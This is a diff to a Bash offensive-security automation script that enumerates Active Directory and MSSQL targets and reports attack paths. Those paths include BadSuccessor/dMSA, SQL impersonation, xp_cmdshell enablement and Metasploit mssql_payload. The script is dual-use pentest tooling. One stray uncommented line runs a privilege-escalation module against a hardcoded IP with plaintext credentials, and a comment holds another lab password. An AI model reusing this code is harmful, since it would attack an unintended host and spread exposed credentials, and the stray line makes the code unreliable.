+    warn \
+        "xp_cmdshell module completed, but its result could not be classified"
+
+    [[ "$cmdshell_rc" -ne 0 ]] &&
+        note "NetExec exited with status $cmdshell_rc"
+
+    return 0
+}
+
 # --------- After port scanning completes ----------
 OPEN_PORTS=()   # Will store open ports
 
@@ -4244,6 +5243,9 @@ if  $CREDS_PROVIDED && [ $HAS_LDAP -eq 1 ]  ; then
 fi
 
 # --------- LDAP Enumeration ----------
+if [ $HAS_LDAP -eq 1 ]; then
+    LDAP_FOUND=true
+fi
 if [ -s "$LDAP_MARKER" ] && ! $LDAP_ENUM_DONE; then
     echo
     info "Querying LDAP RootDSE..."
@@ -4265,6 +5267,12 @@ if [ -s "$LDAP_MARKER" ] && ! $LDAP_ENUM_DONE; then
     if $LDAP_ANON_BIND; then
         high_risk "LDAP Exposure Level: Anonymous Directory Access"
     fi
+fi
+if $LDAP_AUTH_BIND; then
+    #Get Domain/AD Version
+    #netexec ldap eighteen.htb -u adam.scott -p 'iloveyou1' --query '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' 'dNSHostName operatingSystem operatingSystemVersion'
+    # Check for BadSuccessor Attack
+    check_badsuccessor || true
 fi
 
 # Verify Creds can Access Windows Host
@@ -4321,10 +5329,7 @@ if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "1433"; then
 fi
 
 # Mark that a live MSSQL instance was found
-MSSQL_NULL_LOGIN=false
-MSSQL_AUTH_OK=false
-MSSQL_INSTANCE_FOUND=false
-MSSQL_USER=""
+
 if [[ "$HAS_MSSQL" == "true" && "$ENABLE_BH_EXPORT" == "true" ]]; then
     echo
     info "MSSQL service detected on port 1433 — beginning enumeration..."
@@ -4476,23 +5481,100 @@ if $CREDS_PROVIDED; then
     fi
 
     # MSSQL
-    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "1433" \
-        && command -v crackmapexec >/dev/null; then
-
-        #echo "[DEBUG] Creds were provided for CME targeting MSSQL"
-       
-        lightbulb "Trying MSSQL:"
-        lightbulb "   ${YELLOW}Copy/Paste:${RESET}"
-            echo -e "        ${GREEN}crackmapexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
-            echo -e "        ${GREEN}netexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
-            record_command "MSSQL" "Discovery" "crackmapexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'"
-            record_command "MSSQL" "Discovery" "netexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'"
-       
-        if crackmapexec mssql "$TARGET_IPV4" -u "$AUTH_USER" -p "$AUTH_PASS" 2>/dev/null \
-            | grep -qi success; then
-            critical "MSSQL credential reuse confirmed"
+    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx '1433'; then
+        if ! command -v netexec >/dev/null 2>&1; then
+   	    warn "MSSQL is open, but netexec is not installed"
         else
-            warn "MSSQL authentication failed or not permitted"
+	    lightbulb "Trying MSSQL:"
+	    lightbulb "   ${YELLOW}Copy/Paste:${RESET}"
+	    
+	    echo -e "        ${GREEN}netexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
+	    echo -e "        ${GREEN}netexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS' --local-auth${RESET}"
+	    
+	    #MSSQL_NULL_LOGIN=false
+    	    #MSSQL_AUTH_OK=false
+   	    #MSSQL_LCLAUTH_OK=false
+    	    #MSSQL_INSTANCE_FOUND=false
+	    #MSSQL_PRIVESC=false
+	    #MSSQL_IMPERSONATE=false
+    	    #MSSQL_USER=""
+    
+	    # Build shell-safe commands. %q correctly handles spaces and special
+            # characters in usernames and passwords.
+            printf -v nxc_command \
+                'netexec mssql %q -u %q -p %q' \
+                "$TARGET_IPV4" "$AUTH_USER" "$AUTH_PASS"
+
+            printf -v nxc_local_command \
+                '%s --local-auth' \
+                "$nxc_command"
+
+	    record_command "MSSQL" "Discovery" "$nxc_command"
+
+	    record_command "MSSQL" "Discovery" "$nxc_local_command"
+
+	    # Only suggest CrackMapExec when it is actually installed.
+	    if command -v crackmapexec >/dev/null 2>&1; then
+	        printf -v cme_command \
+		    'crackmapexec mssql %q -u %q -p %q' \
+	    	    "$TARGET_IPV4" "$AUTH_USER" "$AUTH_PASS"
+
+	        echo -e "        ${GREEN}crackmapexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}" 
+
+	       record_command "MSSQL" "Discovery" "$cme_command"
+	    fi
+
+	    # Standard/domain authentication
+            mssql_output="$(
+                netexec mssql "$TARGET_IPV4" \
+                    -u "$AUTH_USER" \
+                    -p "$AUTH_PASS" 2>&1
+            )" || :
+
+            # Any normal MSSQL result line indicates that an instance responded.
+            if grep -Eq '^MSSQL[[:space:]]+' <<< "$mssql_output"; then
+                MSSQL_INSTANCE_FOUND=true
+            fi
+
+            # NetExec marks successful authentication with [+].
+            if grep -Eq '^MSSQL[[:space:]].*\[\+\]' <<< "$mssql_output"; then
+                MSSQL_AUTH_OK=true
+                critical "MSSQL credential reuse confirmed"
+            fi
+
+            # Local authentication
+            mssql_local_output="$(
+                netexec mssql "$TARGET_IPV4" \
+                    -u "$AUTH_USER" \
+                    -p "$AUTH_PASS" \
+                    --local-auth 2>&1
+            )" || :
+
+            if grep -Eq '^MSSQL[[:space:]]+' <<< "$mssql_local_output"; then
+                MSSQL_INSTANCE_FOUND=true
+            fi
+
+            if grep -Eq '^MSSQL[[:space:]].*\[\+\]' <<< "$mssql_local_output"; then
+                MSSQL_LCLAUTH_OK=true
+                critical "MSSQL local credential reuse confirmed"
+            fi
+            
+            if [[ "${MSSQL_AUTH_OK:-false}" == true ]]; then
+	        run_mssql_rid_brute default
+	        run_mssql_priv_detection default
+	        run_mssql_cmdshell_check default
+	    fi
+	    if [[ "${MSSQL_LCLAUTH_OK:-false}" == true ]]; then
+	        run_mssql_rid_brute local
+	        run_mssql_priv_detection local
+	        run_mssql_cmdshell_check local
+	    fi
+	    
+	    netexec mssql 10.129.26.137 -u 'kevin ' -p 'iNa2we6haRj2gaw!' --local-auth -M mssql_priv -o ACTION=privesc
+
+            if [[ "$MSSQL_AUTH_OK" != true && "$MSSQL_LCLAUTH_OK" != true ]]; then
+                warn "MSSQL authentication failed or was not permitted"
+            fi
         fi
     fi
 fi
@@ -5318,7 +6400,67 @@ attack_path_evaluation() {
     echo -e "${BYELLOW}    Attack Path Decision Engine        ${RESET}"
     echo -e "${BLUE}========================================${RESET}"
     #info "Evaluating LDAP-based attack paths"
+    if [[ $HAS_SMB -eq 1 && $HAS_LDAP -eq 1 && $HAS_KERB -eq 1 ]]; then
+        echo -e "\n ${CYAN}ACTIVE DIRECTORY SERVICES${RESET}"
+        echo -e " --------------------------------------"
+    fi
+    # ---------------------------------------------------------------------------
+    # Domain-controller version context
+    #
+    # DC version information is supporting evidence. It is not treated as an
+    # attack path unless another confirmed finding depends on that version.
+    # ---------------------------------------------------------------------------
+    if [[ "${DC_VERSION_FOUND:-false}" == true ]]; then
+        echo
+        info "Domain controller version context"
 
+        if declare -p DC_DNS_HOSTNAMES >/dev/null 2>&1 && declare -p DC_OPERATING_SYSTEMS >/dev/null 2>&1 && declare -p DC_OPERATING_SYSTEM_VERSIONS >/dev/null 2>&1; then
+            dc_count=${#DC_DNS_HOSTNAMES[@]}
+
+            for ((i = 0; i < dc_count; i++)); do
+                dc_name="${DC_DNS_HOSTNAMES[$i]:-Unknown}"
+                os_name="${DC_OPERATING_SYSTEMS[$i]:-Unknown}"
+                os_version="${DC_OPERATING_SYSTEM_VERSIONS[$i]:-Unknown}"
+                build_number="${DC_BUILD_NUMBERS[$i]:-}"
+
+                echo -e "  ${CYAN}DC:${RESET}      $dc_name"
+                echo -e "  ${CYAN}OS:${RESET}      $os_name"
+                echo -e "  ${CYAN}Version:${RESET} $os_version"
+
+                if [[ -n "$build_number" ]]; then
+                    echo -e "  ${CYAN}Build:${RESET}   $build_number"
+                fi
+
+                if [[ "${os_name,,}" == *"windows server 2025"* ]] || [[ "$build_number" == "26100" ]]; then
+                    dc_2025=true
+                fi
+                echo
+            done
+         else
+            dc_name="${DC_DNS_HOSTNAME:-Unknown}"
+            os_name="${DC_OPERATING_SYSTEM:-Unknown}"
+            os_version="${DC_OPERATING_SYSTEM_VERSION:-Unknown}"
+            build_number="${DC_BUILD_NUMBER:-}"
+
+            echo -e "  ${CYAN}DC:${RESET}      $dc_name"
+            echo -e "  ${CYAN}OS:${RESET}      $os_name"
+            echo -e "  ${CYAN}Version:${RESET} $os_version"
+
+            if [[ -n "$build_number" ]]; then
+                echo -e "  ${CYAN}Build:${RESET}   $build_number"
+            fi
+
+            if [[ "${os_name,,}" == *"windows server 2025"* ]] ||
+                [[ "$build_number" == "26100" ]]; then
+                dc_2025=true
+            fi
+        fi
+
+        if [[ -n "${DC_VERSION_EVIDENCE:-}" ]]; then
+            note "Evidence: ${DC_VERSION_EVIDENCE}"
+        fi
+    fi
+    
     # 1. Kerberoasting (always valid if SPNs found)
     if [[ -v KERBEROAST_TARGETS && ${#KERBEROAST_TARGETS[@]} -gt 0 ]]; then
         ATTACK_PATHS+=("Kerberoasting")
@@ -5385,6 +6527,73 @@ attack_path_evaluation() {
         echo "   - Authenticate as impersonated user (SMB / WinRM / LDAP)"
         echo
     fi
+    # The NetExec BadSuccessor module may independently identify Server 2025.
+    if [[ "${BADSUCCESSOR_DC_2025:-false}" == true ]]; then
+        dc_2025=true
+    fi
+     # ---------------------------------------------------------------------------
+     # BadSuccessor / dMSA
+     #
+     # Add an attack path only when:
+     #   1. A Windows Server 2025 DC was identified.
+     #   2. NetExec found a relevant OU permission.
+     #   3. The trustee applies to the current user or one of their groups.
+     # ---------------------------------------------------------------------------
+     if [[ "${BADSUCCESSOR_CHECK_DONE:-false}" == true || "${BADSUCCESSOR_CANDIDATES_FOUND:-false}" == true || "${BADSUCCESSOR_APPLICABLE:-false}" == true ]]; then
+        echo
+        info "Evaluating BadSuccessor/dMSA findings"
+
+        if [[ "$dc_2025" == true && "${BADSUCCESSOR_CANDIDATES_FOUND:-false}" == true && "${BADSUCCESSOR_APPLICABLE:-false}" == true ]]; then
+            ATTACK_PATHS+=(
+                "BadSuccessor/dMSA OU Permission Abuse Candidate"
+            )
+
+            critical "Attack Path: BadSuccessor/dMSA OU permission abuse candidate"
+
+            echo " - A Windows Server 2025 domain controller was identified"
+            echo " - A writable OU or delegated permission was reported"
+            echo " - The trustee matches the authenticated user or group context"
+
+            if declare -p BADSUCCESSOR_APPLICABLE_TRUSTEES >/dev/null 2>&1; then
+                echo -e " ${YELLOW}Applicable trustee/OU findings:${RESET}"
+
+                for trustee in "${BADSUCCESSOR_APPLICABLE_TRUSTEES[@]}"; do
+                    if [[ -n "$trustee" ]]; then
+                        echo -e "  ${GREEN}- $trustee${RESET}"
+                    fi
+                done
+            fi
+
+            lightbulb "Validation steps:"
+
+            echo " - Confirm the trustee through BloodHound or direct LDAP ACL review"
+            echo " - Validate inherited ACEs, deny ACEs, and effective permissions"
+            echo " - Confirm the Server 2025 update and patch state"
+            echo " - Confirm the domain's dMSA and KDS prerequisites"
+            echo " - Preserve the NetExec output as supporting evidence"
+
+            if [[ -n "${BADSUCCESSOR_EVIDENCE:-}" ]]; then
+                note "Evidence: ${BADSUCCESSOR_EVIDENCE}"
+            fi
+
+        elif [[ "${BADSUCCESSOR_CANDIDATES_FOUND:-false}" == true && "${BADSUCCESSOR_APPLICABLE:-false}" != true ]]; then
+            notify "BadSuccessor OU-permission candidates were reported, but none matched the current user/group context"
+            note "Do not add the finding to the current user's attack paths until trustee membership is confirmed"
+
+            if [[ -n "${BADSUCCESSOR_EVIDENCE:-}" ]]; then
+                note "Evidence: ${BADSUCCESSOR_EVIDENCE}"
+            fi
+
+        elif [[ "${BADSUCCESSOR_APPLICABLE:-false}" == true && "$dc_2025" != true ]]; then
+            notify "A BadSuccessor trustee matched, but Server 2025 DC evidence is missing"
+            note "Treat the finding as incomplete until the DC operating-system version is verified"
+        elif [[ "$dc_2025" == true ]]; then
+            success "Server 2025 DC identified, but no applicable BadSuccessor OU-permission finding was reported"
+        else
+            notify "BadSuccessor assessment completed without a supported attack-path finding"
+        fi
+    fi
+    
     # 6. Kerberoast
     if [[ "$KERBEROAST_HASH_FOUND" == true ]] && [[ "$NTLM_DISABLED" == true ]] && [[ -n "$SPN_NAME" ]]; then
         echo ""
@@ -5495,6 +6704,461 @@ attack_path_evaluation() {
         else
             print_item "$NFS_FOUND" \
                 "- Review RPC/NFS results and test exports with read-only mounts"
+        fi
+    fi
+    
+    # 10. MSSQL Services and Authenticated Access
+    #
+    # Treat either successful authentication result as proof that the MSSQL
+    # instance responded, even if MSSQL_INSTANCE_FOUND was not set because
+    # the discovery output format changed.
+    if [[ "${MSSQL_INSTANCE_FOUND:-false}" == true \
+        || "${MSSQL_AUTH_OK:-false}" == true \
+        || "${MSSQL_LCLAUTH_OK:-false}" == true ]]; then
+
+        echo -e "\n ${CYAN}MSSQL SERVICES${RESET}"
+        echo -e " --------------------------------------"
+        print_item true "MSSQL instance detected on ${TARGET_IPV4}:1433"
+
+        mssql_authenticated=false
+
+        if [[ "${MSSQL_AUTH_OK:-false}" == true ]]; then
+            mssql_authenticated=true
+            print_item true "MSSQL default/domain authentication succeeded"
+        fi
+
+        if [[ "${MSSQL_LCLAUTH_OK:-false}" == true ]]; then
+            mssql_authenticated=true
+            print_item true "MSSQL local authentication succeeded (--local-auth)"
+        fi
+        
+        if [[ "${mssql_authenticated:-false}" == true ]];then
+            #
+            # MSSQL privilege and impersonation findings
+            #
+            if [[ "${MSSQL_PRIV_CHECKED:-false}" == true ]]; then
+                print_item true \
+                    "MSSQL privilege and impersonation checks completed"
+            fi
+
+            if [[ "${MSSQL_IMPERSONATION_FOUND:-false}" == true ]]; then
+                ATTACK_PATHS+=("MSSQL Login Impersonation")
+
+                critical \
+                    "Attack Path: Authenticated MSSQL login can impersonate another SQL principal"
+
+                print_item true \
+                    "MSSQL login impersonation permission discovered"
+
+                if [[ -n "${MSSQL_IMPERSONATION_TARGETS:-}" ]]; then
+                    echo "   - Impersonation targets:"
+
+                    while IFS= read -r mssql_target; do
+                        [[ -n "$mssql_target" ]] || continue
+
+                        printf '       - %b%s%b\n' \
+                            "$BYELLOW" "$mssql_target" "$RESET"
+                    done <<< "$MSSQL_IMPERSONATION_TARGETS"
+                fi
+
+                echo
+                echo "   - Validate each impersonated login manually:"
+
+                while IFS= read -r mssql_target; do
+                    [[ -n "$mssql_target" ]] || continue
+
+                    printf "         EXECUTE AS LOGIN = '%s';\n" \
+                        "${mssql_target//\'/\'\'}"
+
+                    echo \
+                        "         SELECT SYSTEM_USER, ORIGINAL_LOGIN(), IS_SRVROLEMEMBER('sysadmin');"
+
+                    echo \
+                        "         SELECT * FROM fn_my_permissions(NULL, 'SERVER');"
+
+                    echo "         REVERT;"
+                done <<< "$MSSQL_IMPERSONATION_TARGETS"
+
+                echo
+                echo "   - Impersonation does not automatically mean sysadmin."
+                echo "     Check database access, server permissions, linked servers,"
+                echo "     SQL Agent roles, and additional impersonation chains."
+            fi
+
+            if [[ "${MSSQL_PRIVESC_PATH_FOUND:-false}" == true ]]; then
+                ATTACK_PATHS+=("MSSQL Privilege Escalation Path")
+
+                critical \
+                    "Attack Path: MSSQL privilege-escalation path to sysadmin identified"
+
+                print_item true \
+                    "NetExec identified a potential MSSQL path to sysadmin"
+
+                if [[ -n "${MSSQL_PRIVESC_MODE:-}" ]]; then
+                    print_item true \
+                        "Privilege path detected using ${MSSQL_PRIVESC_MODE} authentication"
+                fi
+            fi
+
+            if [[ "${MSSQL_DBOWNER_PRIVESC_FOUND:-false}" == true ]]; then
+                ATTACK_PATHS+=("MSSQL db_owner TRUSTWORTHY Escalation")
+
+                critical \
+                    "Attack Path: MSSQL db_owner/TRUSTWORTHY escalation condition identified"
+
+                print_item true \
+                    "Potential db_owner plus TRUSTWORTHY escalation detected"
+
+                echo "   - Validate the database ownership and TRUSTWORTHY state:"
+                echo "         SELECT"
+                echo "             name,"
+                echo "             is_trustworthy_on,"
+                echo "             SUSER_SNAME(owner_sid) AS owner_name,"
+                echo "             IS_SRVROLEMEMBER("
+                echo "                 'sysadmin',"
+                echo "                 SUSER_SNAME(owner_sid)"
+                echo "             ) AS owner_is_sysadmin"
+                echo "         FROM sys.databases;"
+                echo
+                echo "   - A useful escalation condition is:"
+                echo "       * impersonated login has db_owner"
+                echo "       * database has TRUSTWORTHY enabled"
+                echo "       * database owner is a sysadmin"
+                echo
+                echo "   - Confirm database-level permissions:"
+                echo "         USE [database_name];"
+                echo "         SELECT USER_NAME(), IS_MEMBER('db_owner');"
+                echo "         SELECT * FROM fn_my_permissions(NULL, 'DATABASE');"
+            fi
+
+            if [[ "${MSSQL_PRIVESC_ATTEMPTED:-false}" == true \
+                && "${MSSQL_PRIVESC_OK:-false}" != true \
+                && "${MSSQL_PRIVESC_PATH_FOUND:-false}" != true ]]; then
+
+                if [[ "${MSSQL_IMPERSONATION_FOUND:-false}" == true ]]; then
+                    warn \
+                        "MSSQL impersonation exists, but no direct sysadmin path was confirmed"
+                else
+                    notify \
+                        "MSSQL privilege check completed without identifying a sysadmin path"
+                fi
+            fi
+
+            if [[ "${MSSQL_PRIVESC_OK:-false}" == true ]]; then
+                ATTACK_PATHS+=("MSSQL Sysadmin Access")
+
+                critical \
+                    "Attack Path: MSSQL privilege escalation succeeded"
+
+                print_item true \
+                    "Authenticated MSSQL login was elevated to sysadmin"
+
+                echo "   - Confirm the effective privilege:"
+                echo "         SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');"
+
+                echo "   - Review and execute the recorded rollback command after testing."
+            elif [[ "${MSSQL_SYSADMIN:-false}" == true ]]; then
+                ATTACK_PATHS+=("MSSQL Sysadmin Access")
+
+                critical \
+                    "Attack Path: Authenticated MSSQL sysadmin access confirmed"
+
+                print_item true \
+                    "Authenticated MSSQL login has sysadmin privileges"
+            fi
+
+            #
+            # MSSQL RID brute findings
+            #
+            if [[ "${MSSQL_RIDBRUTE_OK:-false}" == true \
+                || "${MSSQL_RIDBRUTE_LCLAUTH_OK:-false}" == true ]]; then
+
+                ATTACK_PATHS+=("MSSQL RID Enumeration")
+
+                print_item true \
+                    "Domain principals were enumerated through MSSQL RID brute"
+
+                if [[ "${MSSQL_RIDBRUTE_OK:-false}" == true ]]; then
+                    print_item true \
+                        "RID brute succeeded using default/domain authentication"
+                fi
+
+                if [[ "${MSSQL_RIDBRUTE_LCLAUTH_OK:-false}" == true ]]; then
+                    print_item true \
+                        "RID brute succeeded using local MSSQL authentication"
+                fi
+
+                echo "   - RID output may include users, groups, service accounts,"
+                echo "     and computer accounts."
+                echo "   - Validate account types through LDAP before using the"
+                echo "     generated candidate list for authentication testing."
+            fi 
+            #
+            # xp_cmdshell configuration and execution findings
+            #
+            if [[ "${MSSQL_CMDSHELL_CHECKED:-false}" == true ]]; then
+                print_item true \
+                    "MSSQL xp_cmdshell configuration permissions were checked"
+            fi
+
+            if [[ "${MSSQL_CMDSHELL_ENABLE_ATTEMPTED:-false}" == true ]]; then
+                print_item true \
+                    "An xp_cmdshell enablement check was attempted"
+            fi
+
+            #
+            # Highest-confidence result: a command was actually executed.
+            #
+            if [[ "${MSSQL_CMDSHELL_EXEC_OK:-false}" == true ]]; then
+                ATTACK_PATHS+=(
+                    "Confirmed OS Command Execution via MSSQL xp_cmdshell"
+                )
+
+                critical \
+                    "Attack Path: OS command execution through MSSQL xp_cmdshell confirmed"
+
+                print_item true \
+                    "The authenticated SQL context successfully executed an operating-system command"
+
+                echo "   - Determine the Windows execution context:"
+                echo "         EXEC master..xp_cmdshell 'whoami';"
+                echo
+                echo "   - Determine whether execution uses the SQL Server service"
+                echo "     account or an xp_cmdshell proxy account."
+                echo
+                echo "   - Treat this as confirmed remote code execution under the"
+                echo "     returned Windows account."
+                echo
+                echo "   - Record created files, processes, network connections, and"
+                echo "     configuration changes for cleanup."
+
+            #
+            # xp_cmdshell is available, but execution has not been proven.
+            #
+            elif [[ "${MSSQL_CMDSHELL_CONFIG_ENABLED:-false}" == true \
+                || "${MSSQL_CMDSHELL_ALREADY_ENABLED:-false}" == true \
+                || "${MSSQL_CMDSHELL_ENABLE_OK:-false}" == true ]]; then
+
+                ATTACK_PATHS+=(
+                    "Potential OS Command Execution via MSSQL xp_cmdshell"
+                )
+
+                critical \
+                    "Potential Attack Path: MSSQL xp_cmdshell is enabled or was enabled successfully"
+
+                if [[ "${MSSQL_CMDSHELL_ALREADY_ENABLED:-false}" == true \
+                    || "${MSSQL_CMDSHELL_CONFIG_ENABLED:-false}" == true ]]; then
+
+                    print_item true \
+                        "xp_cmdshell is configured as enabled"
+                fi
+
+                if [[ "${MSSQL_CMDSHELL_ENABLE_OK:-false}" == true ]]; then
+                    print_item true \
+                        "The authenticated SQL login successfully enabled xp_cmdshell"
+
+                    warn \
+                        "The xp_cmdshell server configuration was modified during testing"
+
+                    echo "   - Restore its original configuration after validation."
+                fi
+
+                echo "   - Enabled does not necessarily mean the current SQL login"
+                echo "     is allowed to execute xp_cmdshell."
+                echo
+                echo "   - Use a low-impact execution check:"
+                echo "         EXEC master..xp_cmdshell 'whoami';"
+                echo
+                echo "   - A non-sysadmin login requires EXECUTE permission and a"
+                echo "     valid ##xp_cmdshell_proxy_account## credential."
+            fi
+
+            #
+            # The current login could not change the configuration.
+            #
+            if [[ "${MSSQL_CMDSHELL_PERMISSION_DENIED:-false}" == true ]]; then
+                warn \
+                    "MSSQL login cannot enable xp_cmdshell because it cannot run RECONFIGURE"
+
+                print_item true \
+                    "Valid MSSQL authentication confirmed, but server configuration privileges are restricted"
+
+                echo "   - This indicates that the current login does not have the"
+                echo "     required ALTER SETTINGS, CONTROL SERVER, or sysadmin-level"
+                echo "     configuration access."
+                echo
+                echo "   - This does not prove that xp_cmdshell is disabled."
+                echo
+                echo "   - This does not prove that xp_cmdshell execution is denied."
+                echo "     An already-enabled configuration and proxy account may still"
+                echo "     allow a non-sysadmin login to execute it."
+                echo
+                echo "   - Check the configuration without attempting to modify it:"
+                echo "         SELECT"
+                echo "             name,"
+                echo "             value,"
+                echo "             value_in_use"
+                echo "         FROM sys.configurations"
+                echo "         WHERE name = 'xp_cmdshell';"
+                echo
+                echo "   - Then test the current execution permission separately:"
+                echo "         EXEC master..xp_cmdshell 'whoami';"
+
+                if [[ -n "${MSSQL_CMDSHELL_ERROR:-}" ]]; then
+                    printf '   - NetExec error: %s\n' \
+                        "$MSSQL_CMDSHELL_ERROR"
+                fi
+
+                if [[ "${MSSQL_IMPERSONATION_FOUND:-false}" == true ]]; then
+                    echo
+                    echo "   - SQL login impersonation is available. Check whether an"
+                    echo "     impersonation target has stronger configuration or"
+                    echo "     xp_cmdshell execution permissions."
+
+                    while IFS= read -r mssql_target; do
+                        [[ -n "$mssql_target" ]] || continue
+
+                        escaped_target="${mssql_target//\'/\'\'}"
+
+                        printf "         EXECUTE AS LOGIN = N'%s';\n" \
+                            "$escaped_target"
+
+                        echo \
+                            "         SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');"
+
+                        echo \
+                            "         SELECT * FROM fn_my_permissions(NULL, 'SERVER');"
+
+                        echo \
+                            "         EXEC master..xp_cmdshell 'whoami';"
+
+                        echo "         REVERT;"
+                    done <<< "${MSSQL_IMPERSONATION_TARGETS:-}"
+                fi
+            fi
+
+            #
+            # Generic failure not already classified as a permission denial.
+            #
+            if [[ "${MSSQL_CMDSHELL_ENABLE_FAILED:-false}" == true \
+                && "${MSSQL_CMDSHELL_PERMISSION_DENIED:-false}" != true ]]; then
+
+                warn \
+                    "xp_cmdshell enablement failed for an unclassified reason"
+
+                if [[ -n "${MSSQL_CMDSHELL_ERROR:-}" ]]; then
+                    printf '   - NetExec error: %s\n' \
+                        "$MSSQL_CMDSHELL_ERROR"
+                fi
+            fi
+	fi
+
+        if [[ "$mssql_authenticated" == true ]]; then
+            ATTACK_PATHS+=("Authenticated MSSQL Access")
+            critical "Attack Path: Authenticated MSSQL access confirmed"
+            lightbulb "Next Steps (MSSQL):"
+
+            printf -v mssql_auth_command \
+                'netexec mssql %q -u %q -p %q' \
+                "$TARGET_IPV4" "$AUTH_USER" "$AUTH_PASS"
+
+            printf -v mssql_local_command \
+                '%s --local-auth' \
+                "$mssql_auth_command"
+
+            if [[ "${MSSQL_AUTH_OK:-false}" == true ]]; then
+                echo "   - Reconnect using default/domain authentication:"
+                echo -e "         ${GREEN}${mssql_auth_command}${RESET}"
+            fi
+
+            if [[ "${MSSQL_LCLAUTH_OK:-false}" == true ]]; then
+                echo "   - Reconnect using local authentication:"
+                echo -e "         ${GREEN}${mssql_local_command}${RESET}"
+            fi
+            
+            echo "   - Identify the effective and original SQL security contexts:"
+            echo "         SELECT"
+            echo "             SYSTEM_USER AS effective_login,"
+            echo "             ORIGINAL_LOGIN() AS original_login,"
+            echo "             USER_NAME() AS database_user,"
+            echo "             DB_NAME() AS current_database,"
+            echo "             IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;"
+            echo "         SELECT * FROM fn_my_permissions(NULL, 'SERVER');"
+            echo "   - Enumerate accessible databases and permissions:"
+            echo "         SELECT name FROM sys.databases;"
+            echo "   - Review linked servers, impersonation rights, SQL Agent roles,"
+            echo "     TRUSTWORTHY databases, and command-execution features."
+            echo "   - Only test command execution when explicitly authorized and"
+            echo "     the authenticated principal has the required privileges."
+            echo "   - Enumerate server-level impersonation permissions:"
+            echo "         SELECT"
+            echo "             grantee.name AS grantee,"
+            echo "             target.name AS impersonatable_login,"
+            echo "             permission_name,"
+            echo "             state_desc"
+            echo "         FROM sys.server_permissions AS permission"
+            echo "         JOIN sys.server_principals AS grantee"
+            echo "           ON permission.grantee_principal_id = grantee.principal_id"
+            echo "         JOIN sys.server_principals AS target"
+            echo "           ON permission.major_id = target.principal_id"
+            echo "         WHERE permission.permission_name = 'IMPERSONATE';"
+
+            echo "   - Enumerate database ownership and TRUSTWORTHY settings:"
+            echo "         SELECT"
+            echo "             name,"
+            echo "             SUSER_SNAME(owner_sid) AS owner_name,"
+            echo "             is_trustworthy_on"
+            echo "         FROM sys.databases;"
+
+            echo "   - Enumerate linked SQL servers:"
+            echo "         SELECT"
+            echo "             name,"
+            echo "             product,"
+            echo "             provider,"
+            echo "             data_source,"
+            echo "             is_linked,"
+            echo "             is_data_access_enabled,"
+            echo "             is_rpc_out_enabled"
+            echo "         FROM sys.servers;"
+            echo
+            echo "   - xp_cmdshell notes:"
+            echo "       * xp_cmdshell is commonly disabled by default and enabling it"
+            echo "         changes the SQL Server configuration and creates audit artifacts."
+            echo "       * Check its current state without changing configuration:"
+            echo "         SELECT name, value, value_in_use"
+            echo "         FROM sys.configurations WHERE name = 'xp_cmdshell';"
+            echo "       * Confirm the current login and server-role membership first:"
+            echo "         SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');"
+            echo "       * If xp_cmdshell is already enabled, use a low-impact validation:"
+            echo "         EXEC master..xp_cmdshell 'whoami';"
+            echo "       * Enabling xp_cmdshell generally requires CONTROL SERVER:"
+            echo "         EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"
+            echo "         EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+            echo "       * Record the original settings before changing them and restore"
+            echo "         those original values when testing is complete."
+            echo "       * A sysadmin invocation runs under the SQL Server service account."
+            echo "         A non-sysadmin invocation requires an xp_cmdshell proxy account"
+            echo "         and explicit EXECUTE permission on xp_cmdshell."
+            echo
+            echo "   - Metasploit notes:"
+            echo "       * Prefer enumeration modules before payload execution:"
+            echo "         use auxiliary/scanner/mssql/mssql_login"
+            echo "         use auxiliary/admin/mssql/mssql_enum"
+            echo "       * In msfconsole, review the module before running it:"
+            echo "         search mssql"
+            echo "         info"
+            echo "         show options"
+            echo "       * Set RHOSTS, RPORT, USERNAME, and PASSWORD, then use check when"
+            echo "         the selected module supports it."
+            echo "       * exploit/windows/mssql/mssql_payload uses xp_cmdshell to execute"
+            echo "         a payload and may leave an executable on the target."
+            echo "         Use it only when payload execution is explicitly in scope and"
+            echo "         cleanup, logging, and endpoint-impact controls are planned."
+            echo "       * Module names and behavior can vary by installed Metasploit"
+            echo "         version, so verify them with search, info, and show options."
+            echo
+        else
+            warn "MSSQL instance found, but supplied credentials were not accepted"
         fi
     fi
     
